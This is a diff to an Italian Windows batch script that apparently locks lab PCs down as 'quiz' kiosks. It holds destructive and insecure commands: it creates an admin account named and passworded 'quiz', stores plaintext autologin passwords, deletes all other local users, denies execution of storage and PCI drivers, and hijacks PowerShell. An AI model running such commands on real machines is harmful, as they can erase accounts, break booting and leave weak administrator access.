@@ -93,26 +93,86 @@ fltmc >nul 2>&1 || (
     exit /b
 )
 
+
+echo.
+echo.
+echo                       zbbuod8B8boubbz                             
+echo               zzbuod8BBBBBBBBBBBBBBBBRPFTJlIi#z                    
+echo          b=m8BBBBBBBBBBBBBBBRPFTJIIIIIIIIIIIIIII                   
+echo          Izzz#ITVBBBRPFTIIIIIIIIIIII        IIII                   
+echo          Izzzzzzz#IJIIIIIII                 IIII                   
+echo          IzzzzzzzzzIIII                     IIII                   
+echo          IzzzzzzzzzIIII                     IIII                   
+echo          IzzzzzzzzzIIII                     IIII                   
+echo          IzzzzzzzzzIIII                     IIII                   
+echo          IzzzzzzzzzIIII                     IIII                   
+echo          IzzzzzzzzzIIII                     IIII                   
+echo          mzzzzzzzzzIIII                    bIIII                   
+echo           z;zzzzzzzIIII               _z-IIIIIII                   
+echo    zbuodWBBBBbzzzzzIIII       _z-IIIIIIIIIIII#                     
+echo IYBBBBBBBBBBBBBBbzzIIII#zz-IIIIIIIIIIiof68BBBBBbzzzz               
+echo IzzYBBBBBBBBBBBBBBbIIIIIIIIIIIiof68BBBBBBRPFTJI##   mz             
+echo IzzzzYBBBBBBBBBBBBBBbaaitf68BBBBBBRPFTJI#########     mz           
+echo IzzzzzzYBBBBBBBBBBBBBBBBBBBRPFTJI######;#I pm;###       mz         
+echo IzzzzzzzzYBBBBBBBBBBRPFTJI##########   zzz######;         iBBboz   
+echo mzzzzzzzzzzYBRPFTJI########################;iof68boz      WBBBBboz 
+echo   mzzzzzzzzzz#######################;iof688888888888bz     mYBBBP  
+echo     mzzzzzzzz################;iof688888888888888888888bz     m     
+echo       mzzzzzz#########;iof688888888888888888888888888888bz         
+echo         mzzzz###;iof688888888888888888888888888888888899fTI        
+echo           mzz##I8888888888888888888888888888888899fTII p           
+echo             m  II988888888888888888888888899fTII p                 
+echo                 mII8888888888888888899fTII p                       
+echo                   mI988888888899fTII p                             
+echo                     mI9899fTII p                                   
+echo.
+echo.
+
+
+
+setlocal enabledelayedexpansion
 echo Utente corrente: %USERNAME%
-
-:: Se utente NON è quiz, crea account, imposta autologin e fa logout
+:: Se utente NON è quiz, chiedi cosa fare
 if /i not "%USERNAME%"=="quiz" (
-    echo Utente diverso da quiz, creo account quiz e imposto autologin...
-    net user quiz quiz /add
-    net localgroup Administrators quiz /add
+    echo Utente diverso da quiz rilevato.
+    echo.
+    echo Scegli un'opzione:
+    echo [S] - Crea account quiz, imposta autologin e fa logout
+    echo [Invio/N/altro] - Continua con l'utente corrente ed elimina altri utenti
+    echo.
+    set /p "qz_user_choice=Inserisci la tua scelta: "
+    
+    if /i "!qz_user_choice!"=="s" (
+        echo Creo account quiz e imposto autologin...
+        net user quiz quiz /add
+        net localgroup Administrators quiz /add
+        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f
+        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d quiz /f
+        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d quiz /f
+        echo Logout in corso per applicare le modifiche...
+        timeout /t 3 /nobreak >nul
+        shutdown /l
+        exit /b
+    ) else (
+        echo Continuo con l'utente corrente: %USERNAME%
+        echo.
+        set /p "set_autologin=Vuoi impostare l'autologin per l'utente %USERNAME%? [S/N]: "
+        if /i "!set_autologin!"=="s" (
+            echo Imposto autologin per l'utente %USERNAME%...
+            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f
+            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d %USERNAME% /f
 
-    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f
-    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d quiz /f
-    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d quiz /f
-
-    echo Logout in corso per applicare le modifiche...
-    timeout /t 3 /nobreak >nul
-    shutdown /l
-    exit /b
+            set /p "current_password=Inserisci la password dell'utente %USERNAME% e fai attenzione a non sbagliare: "
+            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "!current_password!" /f
+            echo Autologin impostato per %USERNAME%.
+        ) else (
+            echo Autologin non impostato.
+        )
+        echo.
+    )
 )
 
 echo Eseguo eliminazione utenti non autorizzati...
-
 for /f "skip=1 tokens=1" %%a in ('net user') do (
     set "user=%%a"
     if not "!user!"=="" (
@@ -120,8 +180,10 @@ for /f "skip=1 tokens=1" %%a in ('net user') do (
             if /i not "!user!"=="Administrator" (
                 if /i not "!user!"=="Guest" (
                     if /i not "!user!"=="DefaultAccount" (
-                        echo Eliminazione utente: !user!
-                        net user "!user!" /delete
+                        if /i not "!user!"=="%USERNAME%" (
+                            echo Eliminazione utente: !user!
+                            net user "!user!" /delete
+                        )
                     )
                 )
             )
@@ -129,25 +191,33 @@ for /f "skip=1 tokens=1" %%a in ('net user') do (
     )
 )
 
-
 :: Ottieni il nome dell'utente attualmente loggato
-for /f "tokens=2 delims=\" %%A in ("%USERDOMAIN%\%USERNAME%") do set CURRENT_USER=%%A
-
+for /f "tokens=2 delims=\" %%A in ("%USERDOMAIN%\%USERNAME%") do set "qz_current_user=%%A"
 :: Stampa l'utente corrente
-echo Utente corrente: %CURRENT_USER%
+echo Utente corrente: !qz_current_user!
 
 :: Elenca tutti gli utenti locali
 for /f "skip=1 tokens=1*" %%A in ('wmic useraccount where "localaccount='true'" get name ^| findstr /r /v "^$"') do (
-    set USER=%%A
-    if /i not "!USER!"=="%CURRENT_USER%" (
-        echo Eliminazione utente: !USER!
-        net user "!USER!" /delete
+    set "qz_wmic_user=%%A"
+    if /i not "!qz_wmic_user!"=="!qz_current_user!" (
+        if /i not "!qz_wmic_user!"=="Administrator" (
+            if /i not "!qz_wmic_user!"=="Guest" (
+                if /i not "!qz_wmic_user!"=="DefaultAccount" (
+                    echo Eliminazione utente: !qz_wmic_user!
+                    net user "!qz_wmic_user!" /delete
+                )
+            )
+        )
     )
 )
+endlocal
 
 echo Operazione completata.
-
 echo Utenti non autorizzati eliminati.
+
+
+
+
 
 echo.
 
@@ -1754,6 +1824,31 @@ icacls C:\Windows\SystemApps\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy
 rd /s /q C:\Windows\SystemApps\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy
 :: icacls C:\Windows\System32\diagnosticshub.standardcollector.runtime.dll /deny *S-1-1-0:F
 
+REM blocco icalcs (rischio script broken se non si sa cosa si sta facendo)
+icacls "C:\Windows\System32\drivers\USBSTOR.sys" /deny SYSTEM:(RX)
+icacls "C:\Windows\System32\drivers\WpdUsb.sys" /deny SYSTEM:(RX)
+icacls "C:\Windows\System32\drivers\SDCARD.sys" /deny SYSTEM:(RX)
+icacls "C:\Windows\System32\drivers\smartcard.sys" /deny SYSTEM:(RX)
+icacls "C:\Windows\System32\drivers\storahci.sys" /deny SYSTEM:(RX)
+icacls "C:\Windows\System32\drivers\bdas.sys" /deny SYSTEM:(RX)
+icacls "C:\Windows\System32\drivers\thunderbolt.sys" /deny SYSTEM:(RX)
+icacls "C:\Windows\System32\drivers\NtbCx.sys" /deny SYSTEM:(RX)
+icacls "C:\Windows\System32\drivers\NtbCx2.sys" /deny SYSTEM:(RX)
+icacls "C:\Windows\System32\drivers\NtbInterface.sys" /deny SYSTEM:(RX)
+icacls "C:\Windows\System32\drivers\usbvideo.sys" /deny SYSTEM:(RX)
+icacls "C:\Windows\System32\drivers\ks.sys" /deny SYSTEM:(RX)
+icacls "C:\Windows\System32\drivers\usbccgp.sys" /deny SYSTEM:(RX)
+icacls "C:\Windows\System32\drivers\rtlsdr.sys" /deny SYSTEM:(RX) 2
+icacls "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /deny Everyone:(X)
+icacls "C:\Program Files\PowerShell\7\pwsh.exe" /deny Everyone:(X)
+icacls "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe" /deny Everyone:(X)
+icacls "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /deny Everyone:(X)
+icacls "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" /deny Everyone:(X)
+icacls "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe" /deny Everyone:(X)
+icacls "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe" /deny Everyone:(X)
+icacls "C:\Program Files\PowerShell\7\pwsh.exe" /deny Everyone:(X)
+icacls "C:\Program Files (x86)\PowerShell\7\pwsh.exe" /deny Everyone:(X)
+
 
 echo.
 color 04
@@ -1861,7 +1956,6 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "Dis
 REM Disattiva il Task Manager anche da Ctrl+Alt+Del
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
 REM Disattiva riavvio/chiusura da menu Start
-color 05
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoClose" /t REG_DWORD /d "1" /f
 REM Disattiva Impostazioni (app moderna)
 reg add "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v "SettingsPageVisibility" /t REG_SZ /d "hide:*" /f
@@ -1956,10 +2050,6 @@ reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Ex
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoFileMenu" /t REG_DWORD /d "1" /f
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoStartMenuMorePrograms" /t REG_DWORD /d "1" /f
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f
-REM Blocca accesso a cmd
-REM reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d "2" /f
-REM reg add "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d 1 /f
-REM reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 0 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers\Paths\{11111111-1111-1111-1111-111111111111}" /v ItemData /t REG_SZ /d "C:\\Windows\\SystemApps\\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\\ShellExperienceHost.exe" /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers\Paths\{11111111-1111-1111-1111-111111111112}" /v ItemData /t REG_SZ /d "C:\\Windows\\SystemApps\\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\\StartMenuExperienceHost.exe" /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers\Paths\{11111111-1111-1111-1111-111111111113}" /v ItemData /t REG_SZ /d "C:\\Windows\\SystemApps\\Microsoft.Windows.TextInput.InputApp_cw5n1h2txyewy\\TextInputHost.exe" /f
@@ -1968,12 +2058,144 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers\Paths\{1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers\Paths\{11111111-1111-1111-1111-111111111113}" /v SaferFlags /t REG_DWORD /d 1 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers" /v PolicyScope /t REG_DWORD /d 1 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers" /v TransparentEnabled /t REG_DWORD /d 0 /f
-
-REM Disattiva Editor del Registro (regedit)
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f
-
-
+REM Blocco bluetooth
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceClasses" /v "{e0cbf06c-cd8b-4647-bb8a-263b43f0f974}" /t REG_SZ /d "1" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\bthport" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\bthserv" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\bthusb" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\bthaudio" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\bthhfenum" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\bthrfcomm" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\Software\Policies\Microsoft\Windows\Bluetooth" /v "DisableBluetooth" /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" /v "BTHENUM" /t REG_SZ /d "1" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" /v "BTHUSB" /t REG_SZ /d "1" /f
+sc config bthserv start= disabled
+sc stop bthserv
+sc config bthbmgr start= disabled
+sc stop bthbmgr
+sc config btagsvc start= disabled
+sc stop btagsvc
+sc config bthhfenum start= disabled
+sc stop bthhfenum
+sc config bthrfcomm start= disabled
+sc stop bthrfcomm
+sc config bthservstart start= disabled
+sc stop bthservstart
+sc config bthhfenum start= disabled
+sc stop bthhfenum
+pnputil /disable-device "BTHENUM\*"
+pnputil /disable-device "BTHUSB\*"
+devcon disable =BTHENUM\*
+devcon disable =BTHUSB\*
+REM Blocco totale powershell
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\pwsh.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell_ise.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\pwsh.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers" /v PolicyScope /t REG_DWORD /d 0 /f
+reg add "HKLM\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers" /v TransparentEnabled /t REG_DWORD /d 1 /f
+reg add "HKLM\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers" /v DefaultLevel /t REG_DWORD /d 0x00040000 /f
+reg add "HKLM\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers\0\Paths\{0001}" /v ItemData /t REG_SZ /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers\0\Paths\{0001}" /v SaferFlags /t REG_DWORD /d 0 /f
+assoc .ps1=
+ftype Microsoft.PowerShellScript=
+sc config WinRM start= disabled
+sc stop WinRM
+REM Prevenzione WannaCry
+sc.exe config lanmanworkstation depend= bowser/mrxsmb20/nsi
+sc.exe config mrxsmb10 start= disabled
+gpupdate /force
+REM Disattivazione CMD (Prompt dei comandi)
+reg add "HKLM\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers" /v "PolicyScope" /t REG_DWORD /d 0 /f
+reg add "HKLM\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers" /v "TransparentEnabled" /t REG_DWORD /d 1 /f
+reg add "HKLM\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers\0\Paths\{00000000-0000-0000-0000-000000000001}" /v "ItemData" /t REG_SZ /d "%SystemRoot%\System32\cmd.exe" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers\0\Paths\{00000000-0000-0000-0000-000000000001}" /v "SaferFlags" /t REG_DWORD /d 0x00000001 /f
+REM Blocca altre USB o storage esterni es MTP/Cdrom/FloppyDisk e tanto altro ancora
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 255 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" /v "DenyRemovableDevices" /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\StorageDevicePolicies" /v WriteProtect /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\mountmgr" /v NoAutoMount /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\RemovableStorageDevices" /v Deny_Read /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\RemovableStorageDevices" /v Deny_Write /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\RemovableStorageDevices" /v Deny_All /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Cdrom" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\WpdUsb" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Flpydisk" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Udfs" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Cdfs" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\ViaFloppy" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Storflt" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Wpdmtp" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\1394ohci" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\1394bus" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\ShellHWDetection" /v Start /t REG_DWORD /d 4 /f
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" /v "USBSTOR" /t REG_SZ /d "1" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\SDCARD" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Smartcard" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\SmartcardSvr" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\IrSIR" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\RdpInfrared" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\bdas" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\thunderbolt" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\NtbCx" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\NtbCx2" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\NtbInterface" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\pcihid" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\pciidex" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\pciexpress" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceClasses" /v "{EEC5AD98-8080-425F-922A-DABF3DE3F69A}" /t REG_SZ /d "1" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceClasses" /v "{50DD5230-BA8A-11D1-BF5D-0000F805F530}" /t REG_SZ /d "1" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceClasses" /v "{4D36E967-E325-11CE-BFC1-08002BE10318}" /t REG_SZ /d "1" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceClasses" /v "{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}" /t REG_SZ /d "1" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceClasses" /v "{6AC27878-A6FA-4155-BA85-F98F491D4F33}" /t REG_SZ /d "1" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" /v "SDBus" /t REG_SZ /d "1" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" /v "SDMMC" /t REG_SZ /d "1" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" /v "SCFilter" /t REG_SZ /d "1" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" /v "SC" /t REG_SZ /d "1" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\mountmgr" /v NoAutoMount /t REG_DWORD /d 1 /f
+sc config IrSIR start= disabled
+sc stop IrSIR
+sc config RdpInfrared start= disabled
+sc stop RdpInfrared
+sc config Smartcard start= disabled
+sc stop Smartcard
+sc config SmartcardSvr start= disabled
+sc stop SmartcardSvr
+devcon disable USBSTOR*
+pnputil /remove-device USBSTOR*
+REM Blocco microfono-webcam
+sc config AudioSrv start= disabled
+sc stop AudioSrv
+sc config AudioEndpointBuilder start= disabled
+sc stop AudioEndpointBuilder
+sc config FrameServer start= disabled
+sc stop FrameServer
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam" /v Value /t REG_SZ /d "Deny" /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam" /v Value /t REG_SZ /d "Deny" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone" /v Value /t REG_SZ /d "Deny" /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone" /v Value /t REG_SZ /d "Deny" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\audiosrv" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\AudioEndpointBuilder" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\avrt" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDisableClip /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Terminal Server" /v fDisableClip /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDisableCam /t REG_DWORD /d 1 /f
+REM Altri blocchi
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\rtlsdr" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\hackrf" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\sptd" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\VClone" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\PvrMiniDrv" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\aavs" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\aavm" /v Start /t REG_DWORD /d 4 /f
+sc config vhdmp start= disabled
+sc stop vhdmp
+echo.
+echo.
+echo.
     echo.
 echo                    ###################                    
 echo                 ######             #######                
@@ -2020,7 +2242,88 @@ echo.
 endlocal
 echo.
 echo.
+REM CODICE INUTILIZZATO!
+:: taskkill /IM "rundll32.exe" /F 2>nul
+:: for %%F in (C:\Program Files\DAEMON\Tools* "C:\Program Files\VirtualCloneDrive\*" "C:\Program Files\PowerISO\*") do (
+::     if exist "%%~F" (
+::         echo Blocca software virtual drive: %%~F
+::     )
+:: )
+:: sc config LanmanServer start= disabled
+:: sc stop LanmanServer
+:: sc config LanmanWorkstation start= disabled
+:: sc stop LanmanWorkstation
+REM Disattiva Editor del Registro (regedit)
+::reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
+::reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f
+REM Blocca accesso a cmd
+REM reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d "2" /f
+REM reg add "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d 1 /f
+REM reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 0 /f
+:: reg add "HKLM\SYSTEM\CurrentControlSet\Services\WudfPf" /v Start /t REG_DWORD /d 4 /f
+:: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceClasses" /v "{36FC9E60-C465-11CF-8056-444553540000}" /t REG_SZ /d "1" /f
+:: reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Class\{36FC9E60-C465-11CF-8056-444553540000}" /v UpperFilters /f
+:: reg add "HKLM\SYSTEM\CurrentControlSet\Services\pci" /v Start /t REG_DWORD /d 4 /f
+:: mountvol /n
+:: reg add "HKLM\SYSTEM\CurrentControlSet\Services\Storsvc" /v Start /t REG_DWORD /d 4 /f
+:: reg add "HKLM\SYSTEM\CurrentControlSet\Services\storahci" /v Start /t REG_DWORD /d 4 /f
+:: sc config vds start= disabled
+:: sc stop vds
+:: reg add "HKLM\SYSTEM\CurrentControlSet\Services\vds" /v Start /t REG_DWORD /d 4 /f
+:: sc config mountmgr start= disabled
+:: sc stop mountmgr
 echo.
+echo.
+color 05
+setlocal
+echo.
+@echo off
+echo                             #############           
+echo                          #######     ######         
+echo                        #####            ####        
+echo                      #####               ###        
+echo                     ####     ###################### 
+echo                    ####     ##            #       ##
+echo                   ####      ##            #       ##
+echo ####             #####      ##            #       ##
+echo #####           #####       ########################
+echo   #######   #######         ##                    ##
+echo     ############            ##                    ##
+echo                             ##                    ##
+echo                             ##                    ##
+echo                             ##                    ##
+echo                             ##                    ##
+echo                             ##                    ##
+echo                             ##                    ##
+echo                             ##                    ##
+echo                              ##                   ##
+echo                               ##                ### 
+echo                                #####         ####   
+echo                                    ###########      
+echo.
+echo.
+echo.
+echo Vuoi disattivare completamente la modifica del registro di sistema?
+echo [s = Sì]  [n o INVIO = No]
+set /p decisione=Confermi? [s/n]:
+REM Prendi solo il primo carattere (se esiste)
+if defined decisione (
+    set "input=%decisione:~0,1%"
+) else (
+    set "input=n"
+)
+REM Controllo insensibile al maiuscolo
+if /i "%input%"=="s" (
+    echo.
+    echo Applicazione blocco modifica registro...
+    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul 2>&1
+    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul 2>&1
+    echo Blocco registro applicato correttamente.
+) else (
+    echo.
+    echo Blocco registro non applicato.
+)
+endlocal
 echo.
 :: Colore super figo
 color 02
